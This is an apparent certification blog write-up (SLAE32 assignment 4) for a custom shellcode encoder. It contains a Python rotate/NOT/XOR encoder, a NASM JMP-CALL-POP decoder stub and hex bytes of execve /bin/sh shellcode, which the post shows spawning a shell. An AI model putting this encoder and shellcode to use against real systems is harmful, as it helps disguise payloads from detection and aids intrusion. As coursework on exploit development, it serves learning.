Title: SLAE32 - Assignment 4
Date: 2022-06-04T09:40:01.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: PA-30398</p><h2 id="source-code">Source Code</h2><!--kg-card-begin: markdown--><p>For this assignment, I uploaded the following files inside the folder <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/4">assignment/4</a>:</p>
<ul>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/4/encoder.py">encoder.py</a>: Python encoder using ROR/ROL-NOT-XOR instructions</li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/4/decoder.nasm">decoder.nasm</a>: Assembly decoder for the encoder above</li>
</ul>
<!--kg-card-end: markdown--><h2 id="encoding-scheme">Encoding Scheme</h2><p>I tried to think of an encoder that uses just a few mathematical operations and that's not too obvious like XOR encoders.</p><!--kg-card-begin: markdown--><p>My implementation looks like this:</p>
<ol>
<li>rotate:
<ol>
<li>even-index bytes <code>ROT_EVEN</code> times using ROR (Right Rotation)</li>
<li>odd-index bytes <code>ROT_ODD</code> times using ROL (Left Rotation)</li>
</ol>
</li>
<li>invert (<code>NOT</code>) each byte</li>
<li>XOR each byte with the least significant byte of the length of the shellcode (<code>SHELL_CODE_LENGTH</code>, made up of 2 bytes)</li>
</ol>
<!--kg-card-end: markdown--><p>The encoded shellcode (with the prepended auxiliary bytes) should look like this:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/06/image-4.png" class="kg-image" alt="Visual representation of the encoded shellcode" loading="lazy" width="773" height="377" srcset="__GHOST_URL__/content/images/size/w600/2022/06/image-4.png 600w, __GHOST_URL__/content/images/2022/06/image-4.png 773w" sizes="(min-width: 720px) 720px"><figcaption>Visual representation of the encoded shellcode</figcaption></figure><h2 id="python-encoder">Python Encoder</h2><p>Follows the python code that reads the shellcode stored inside <code>--input</code>, encodes it according to the previous scheme, and saves it into <code>--output</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--input", help="File containing shellcode to encode", required=True)
    parser.add_argument("-o", "--output", help="Store the encoded shellcode in this file", required=False)

    args = parser.parse_args()
    input_file = args.input
    output_file = args.output

    shellcode = read_shellcode(input_file)
    encoded_shellcode = manage_shellcode_encoding(input_file, output_file)

    assert shellcode == manage_shellcode_decoding(encoded_shellcode)</code></pre><figcaption>After the shellcode is encoded, the program <code>asserts</code> whether the decoded version is correct</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">def encode_shellcode(shellcode: bytes) -&gt; bytes:
    encoded_shellcode = bytearray()
    print(f"[+] Original non-encoded shellcode (HEX): {shellcode.hex()}")

    shellcode_length_least_byte = len(shellcode) % 256
    shellcode_length_most_byte = len(shellcode) // 256

    ROT_EVEN, ROT_ODD = gen_random_rotations(ms_byte=shellcode_length_most_byte, ls_byte=shellcode_length_least_byte)
    shellcode_length_least_byte = shellcode_length_least_byte ^ ROT_EVEN
    shellcode_length_most_byte = shellcode_length_most_byte ^ ROT_ODD</code></pre><figcaption>The Least/Most Significant Bytes are XOR-ed with <code>ROT_EVEN</code>/<code>ROT_ODD</code> in order to avoid <strong>null bytes</strong>, e.g. shellcode of 256 bytes -&gt; <code>0x0100</code></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">    print(f"[+] Rotations for even-index bytes: {ROT_EVEN} (hex: {hex(ROT_EVEN)})")
    print(f"[+] Rotations for odd-index bytes: {ROT_ODD} (hex: {hex(ROT_ODD)})")
    print(f"[+] Least Significant Byte of Shellcode Length XOR-ed with ROT_EVEN: {shellcode_length_least_byte} (hex: {hex(shellcode_length_least_byte)})")
    print(f"[+] Most Significant Byte of Shellcode Length XOR-ed with ROT_ODD: {shellcode_length_most_byte} (hex: {hex(shellcode_length_most_byte)})")

    encoded_shellcode.append(ROT_EVEN)
    encoded_shellcode.append(ROT_ODD)
    encoded_shellcode.append(shellcode_length_least_byte)
    encoded_shellcode.append(shellcode_length_most_byte)</code></pre><figcaption>Some auxiliary bytes are prepended to the encoded shellcode, in order for the decoder stub to decode it</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">    print(f"[+] Helper bytes for decoding (HEX): {encoded_shellcode.hex()}")

    # 1. Rotate bytes
    #   1.1. EVEN index -&gt; Rotate to the Right ROT_EVEN times
    #   1.2. ODD index -&gt; Rotate to the Left ROT_ODD times
    # 2. NOT each byte
    # 3. XOR each byte with the Least Significant Byte of the shellcode length
    #   (shellcode_length_least_byte), which is XOR-ed with ROT_EVEN to avoid null_bytes
    print(f"\n[#] Encoding ...")

    for index, byte in enumerate(shellcode):
        if index % 2 == 0:
            # even index byte
            # print(f"[+] EVEN | Original byte: {hex(byte)}")

            encoded_byte = bitwise_ror(byte, ROT_EVEN, 8)
            # print(f"[+] EVEN | Rotated byte: {hex(encoded_byte)}")

            encoded_byte = bitwise_not(encoded_byte)
            # print(f"[+] EVEN | NOT-ed byte: {hex(encoded_byte)}")</code></pre><figcaption><code>ROR</code>/<code>ROL</code> functions are taken from <a href="https://www.falatic.com/index.php/108/python-and-bitwise-rotation">Technological Masochism</a></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">            if shellcode_length_least_byte != encoded_byte:
                encoded_byte ^= shellcode_length_least_byte
                # print(f"[+] EVEN | Xored byte: {hex(encoded_byte)}\n")</code></pre><figcaption>Avoid <code>XOR</code>-ing bytes equal to <code>shellcode_length_least_byte</code>, as it would result in <code>NULL</code> bytes</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">        else:
            # odd index byte
            # print(f"[+] ODD | Original byte: {hex(byte)}")

            encoded_byte = bitwise_rol(byte, ROT_ODD, 8)
            # print(f"[+] ODD | Rotated byte: {hex(encoded_byte)}")

            encoded_byte = bitwise_not(encoded_byte)
            # print(f"[+] ODD | NOT-ed byte: {hex(encoded_byte)}")

            if shellcode_length_least_byte != encoded_byte:
                encoded_byte ^= shellcode_length_least_byte
                # print(f"[+] ODD | Xored byte: {hex(encoded_byte)}\n")
        
        encoded_shellcode.append(encoded_byte)

    assert 0x00 not in encoded_shellcode
    return encoded_shellcode</code></pre><figcaption>The program fails if <code>NULL</code> bytes are present in the encoded shellcode</figcaption></figure><p>I ran the script multiple times with larger shellcodes, so I'm pretty sure (like ~98%) that the encoded shellcode won't contain <code>NULL</code> bytes.</p><p>The full script is stored on GitHub at <a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/4/encoder.py">rbctee/SlaeExam</a>.</p><h2 id="python-decoder">Python Decoder</h2><p>Inside the previous <code>python</code> script I also implemented a function that decodes the encoded shellcode:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">def decode_shellcode(encoded_shellcode: bytes) -&gt; bytes:
    decoded_shellcode = bytearray()

    ROT_EVEN, ROT_ODD = encoded_shellcode[:2]
    shellcode_length_least_byte = encoded_shellcode[2]
    shellcode_length_most_byte = encoded_shellcode[3]
    encoded_shellcode_main = encoded_shellcode[4:]</code></pre><figcaption>Extract the <strong>auxiliary bytes</strong> prepended to the encoded shellcode</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">    print(f"\n[#] Decoding ...")
    for index, encoded_byte in enumerate(encoded_shellcode_main):

        if index % 2 == 0:
            if encoded_byte != shellcode_length_least_byte:
            	decoded_byte = encoded_byte ^ shellcode_length_least_byte</code></pre><figcaption>Check if the index is <code>odd</code>/<code>even</code>. Moreover, if the encoded byte is equal to the <code>Least Significant Byte</code> of the shellcode length, then ignore it</figcaption></figure><pre><code class="language-py">            else:
            	decoded_byte = encoded_byte

            decoded_byte = bitwise_not(decoded_byte)
            decoded_byte = bitwise_rol(decoded_byte, ROT_EVEN, 8)
        else:
            if encoded_byte != shellcode_length_least_byte:
            	decoded_byte = encoded_byte ^ shellcode_length_least_byte
            else:
            	decoded_byte = encoded_byte

            decoded_byte = bitwise_not(decoded_byte)
            decoded_byte = bitwise_ror(decoded_byte, ROT_ODD, 8)

        decoded_shellcode.append(decoded_byte)

    print(f"[+] Decoded shellcode (HEX): {decoded_shellcode.hex()}")
    return decoded_shellcode</code></pre><!--kg-card-begin: markdown--><p>For every byte of the encoded shellcode, the function does the following:</p>
<ol>
<li><code>XOR</code> each byte with the value of <code>shellcode_length_least_byte</code>, made exception for bytes equal to it</li>
<li><code>NOT</code> each byte</li>
<li>Rotate bytes
<ul>
<li>if the index of the byte is <code>even</code>, then rotate to the left (<code>ROL</code>) <code>ROT_EVEN</code> times</li>
<li>if the index of the byte is <code>odd</code>, then rotate to the right (<code>ROR</code>) <code>ROT_ODD</code> times</li>
</ul>
</li>
</ol>
<!--kg-card-end: markdown--><p>Once you execute the script, it shows how to use it:</p><pre><code class="language-bash">python3 encoder.py -h

# usage: encoder.py [-h] -i INPUT [-o OUTPUT]

# optional arguments:
#   -h, --help            show this help message and exit
#   -i INPUT, --input INPUT
#                         File containing shellcode to encode
#   -o OUTPUT, --output OUTPUT
#                         Store the encoded shellcode in this file</code></pre><p>If you pass the correct arguments, in encodes your shellcode and <em>asserts</em> that it can be decoded correctly:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">echo "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\xb0\x0b\x89\xe3\x8d\x4c\x24\x08\x8d\x54\x24\x08\xcd\x80" &gt; shellcode.bin

python3 encoder.py -i ./shellcode.bin -o /tmp/encoded.binc

# [+] Non-encoded shellcode (HEX): 31c050686e2f7368682f2f6269b00b89e38d4c24088d542408cd800a
# [+] Non-encoded shellcode length: 28 bytes
# [+] Rotations for even-index bytes: 2 (hex: 0x2)
# [+] Rotations for odd-index bytes: 168 (hex: 0xa8)
# [+] Least Significant Byte of Shellcode Length XOR-ed with ROT_EVEN: 30 (hex: 0x1e)
# [+] Most Significant Byte of Shellcode Length XOR-ed with ROT_ODD: 168 (hex: 0xa8)
# [+] Helper bytes for decoding (HEX): 02a81ea8

# [#] Encoding ...
# [+] Encoded shellcode (HEX): 02a81ea8ad21f5897ace3d89fbce2a83bb512368196cf2c5e36cf4c5e32cc1eb
# [+] Encoded shellcode length: 32 bytes
# [+] Assembly data: 0x2,0xa8,0x1e,0xa8,0xad,0x21,0xf5,0x89,0x7a,0xce,0x3d,0x89,0xfb,0xce,0x2a,0x83,0xbb,0x51,0x23,0x68,0x19,0x6c,0xf2,0xc5,0xe3,0x6c,0xf4,0xc5,0xe3,0x2c,0xc1,0xeb

# [#] Decoding ...
# [+] Decoded shellcode (HEX): 31c050686e2f7368682f2f6269b00b89e38d4c24088d542408cd800a</code></pre><figcaption>Encoding/Decoding shellcode</figcaption></figure><p>The line starting with <strong>Assembly data:</strong> contains the bytes you can copy-paste into the NASM skeleton file and use them with the <code>JMP-CALL-POP</code> technique:</p><pre><code class="language-bash"># [+] Assembly data: 0x2,0xa8,0x1e,0xa8,0xad,0x21,0xf5,0x89,0x7a,0xce,0x3d,0x89,0xfb,0xce,0x2a,0x83,0xbb,0x51,0x23,0x68,0x19,0x6c,0xf2,0xc5,0xe3,0x6c,0xf4,0xc5,0xe3,0x2c,0xc1,0xeb</code></pre><h2 id="assembly-decoder">Assembly Decoder</h2><p>The first step is to prepare the skeleton (i.e. a generic template) of the decoder.</p><p>I used the same shown in the <code>Episode 31</code> of the course, employed in conjunction with the <code>Insertion</code> encoder:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">; Author: Robert C. Raducioiu (rbct)

global _start

section .text

_start:

    xor ebx
    mul ebx

    jmp short CallShellcode

Shellcode:

    pop esi

Decode:

    ; ...

    jmp short Decode

CallShellcode:

    call Shellcode
    encoded: db 0x2,0xa8,0x1e,0xa8,0xad,0x21,0xf5,0x89,0x7a,0xce,0x3d,0x89,0xfb,0xce,0x2a,0x83,0xbb,0x51,0x23,0x68,0x19,0x6c,0xf2,0xc5,0xe3,0x6c,0xf4,0xc5,0xe3,0x2c,0xc1,0xeb</code></pre><figcaption><code>NASM</code> shellcode decoder template</figcaption></figure><p>As you can see, it is based on the famous <code>JMP-CALL-POP</code> technique in order to get a reference to the shellcode.</p><p>I chose to use this because the other one I knew (pushing groups of <code>4</code> bytes on the stack) would increase the size of the shellcode.</p><p>Anyways, now the routine <code>Decode</code> must be implemented to decode the encoded shellcode.</p><p>As mentioned previously, the first decoding operation is the following:</p><!--kg-card-begin: markdown--><blockquote>
<ol>
<li><code>XOR</code> each byte with the value of <code>shellcode_length_least_byte</code>, made exception for bytes equal to it</li>
</ol>
</blockquote>
<!--kg-card-end: markdown--><figure class="kg-card kg-code-card"><pre><code class="language-nasm">_start:
    ; clear some registers for later use
    xor ebx, ebx
    mul ebx
    mov ecx, eax

    jmp short CallShellcode

Shellcode:

    ; get a reference to the encoded shellcode
    pop esi

    ; copy the address of the first encoded assembly instruction into EBX
    ;   +4 -&gt; skip the first 4 auxiliary bytes 
    lea ebx, [esi+4]

    ; copy ROT_EVEN and ROT_ODD into AX
    ;   AL: ROT_EVEN
    ;   AH: ROT_ODD
    mov ax, WORD [esi]

    ; copy the XOR-ed length of the shellcode into CX
    ;   and XOR it again with ROT_EVEN:ROT_ODD to decode it
    mov cx, WORD [esi+2]
    xor cx, ax

    ; copy the length of the shellcode on the stack, for later use
    push ecx</code></pre><figcaption>Prepare registers before actually jumping to the <code>Decode</code> routine</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">Decode:

    ; copy the length of the shellcode (previous 'push ecx') into DL
    ; and check if the two bytes are the same
    mov dl, [esp]
    cmp dl, BYTE [ebx]

    ; if they are equal jump to the next decoding operation: NOT
    je NotDecode

    ; if they aren't the equal, then XOR the byte with 'shellcode_length_least_byte'
    ;   which is the length of the shellcode XOR-ed with ROT_EVEN
    mov dl, [esi+2]
    xor BYTE [ebx], dl</code></pre><figcaption>Perform the 1st Decoding operation (<code>XOR</code>) or move to the next one, based on the commented condition</figcaption></figure><pre><code class="language-nasm">CallShellcode:

    call Shellcode
    encoded: db 0x2,0xa8,0x1e,0xa8,0xad,0x21,0xf5,0x89,0x7a,0xce,0x3d,0x89,0xfb,0xce,0x2a,0x83,0xbb,0x51,0x23,0x68,0x19,0x6c,0xf2,0xc5,0xe3,0x6c,0xf4,0xc5,0xe3,0x2c,0xc1,0xeb</code></pre><p>Now that the first operation is done, it's time to move to the second one:</p><pre><code class="language-nasm">Decode:

    mov dl, [esp]
    cmp dl, BYTE [ebx]
    je NotDecode

    mov dl, [esi+2]
    xor BYTE [ebx], dl

NotDecode:

    not BYTE [ebx]</code></pre><!--kg-card-begin: markdown--><p>This one is very straightforward: based on the Decode routine I've already shown, if the current byte and the one known as <code>shellcode_length_least_byte</code> are equal, it jumps to <code>NoteDecode</code> in order to perform the <code>NOT</code> operation.</p>
<p>After that, the shellcode has to perform the 3d decoding operation:</p>
<blockquote>
<ol start="3">
<li>Rotate bytes
<ul>
<li>if the index of the byte is <code>even</code>, then rotate to the left (<code>ROL</code>) <code>ROT_EVEN</code> times</li>
<li>if the index of the byte is <code>odd</code>, then rotate to the right (<code>ROR</code>) <code>ROT_ODD</code> times</li>
</ul>
</li>
</ol>
</blockquote>
<!--kg-card-end: markdown--><p>Follows the assembly code of interest:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">RotateBytes:

    ; save EBX before overwriting it
    push ebx

    ; check if the index is EVEN or ODD
    ; Math logic:
    ;   - EBX - ESI = 4 + current_byte_index
    ;   - if the Least Significant Bit is 1, then it is ODD
    ;   - use test to set the ZF flag if the index is ODD
    sub ebx, esi
    test bl, 1

    ; restore EBX and load the byte into DL
    pop ebx
    mov dl, BYTE [ebx]

    ; if the ZF flag is set, the index is ODD
    jnz RotateOdd</code></pre><figcaption>The shellcode checks if the index of the current byte is <code>ODD</code>/<code>EVEN</code>, then sets the <code>ZF</code> flag accordingly</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-nasm">RotateEven:

    ; Rotate the byte ROT_EVEN times
    mov cl, al
    rol dl, cl
    jmp short AfterRotateByte

RotateOdd:

    ; rotate the byte ROT_ODD times
    mov cl, ah
    ror dl, cl
</code></pre><figcaption>I wrote two different assembly routines, one to decode <strong>even-indexed</strong> bytes, and the other one to decode <strong>odd-indexed</strong> bytes</figcaption></figure><pre><code class="language-nasm">AfterRotateByte:

    ; replace the original rotated byte with the decoded one
    mov BYTE [ebx], dl

    ; decrease the loop counter (size of the shellcode)
    dec WORD [esp]

    ; if the loop counter reaches 0, then jump to the decoded shellcode, skipping the auxiliary bytes
    jz encoded+4

    ; increase the offset of the next byte to be decoded, and jump to decode it
    inc ebx
    jmp short Decode
</code></pre><p>The full program can be found <a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/4/decoder.nasm">here</a>.</p><p>I used the following commands to confirm it works correctly:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">rbct@slae:~$ vim decoder.nasm
rbct@slae:~$ nasm -f elf32 decoder.nasm
rbct@slae:~$ ld -N -o decoder decoder.o
rbct@slae:~$ ./decoder
$ whoami
# rbct
$ id 
# uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
$ exit
rbct@slae:~$</code></pre><figcaption>Shellcode decoded and run successfully</figcaption></figure><p>Among the drawbacks of this approach, the length of the decoder stub is quite apparent.</p><p>Considering the length of the original shellcode is <code>28</code> bytes, and the length of the full shellcode is <code>106</code> bytes, that means the decode stub uses <code>78</code> bytes, which is like <code>3x</code> times the length of the original shellcode.</p><p>Although it may not be optimal for small shellcode, it can be useful for bigger shellcodes.</p>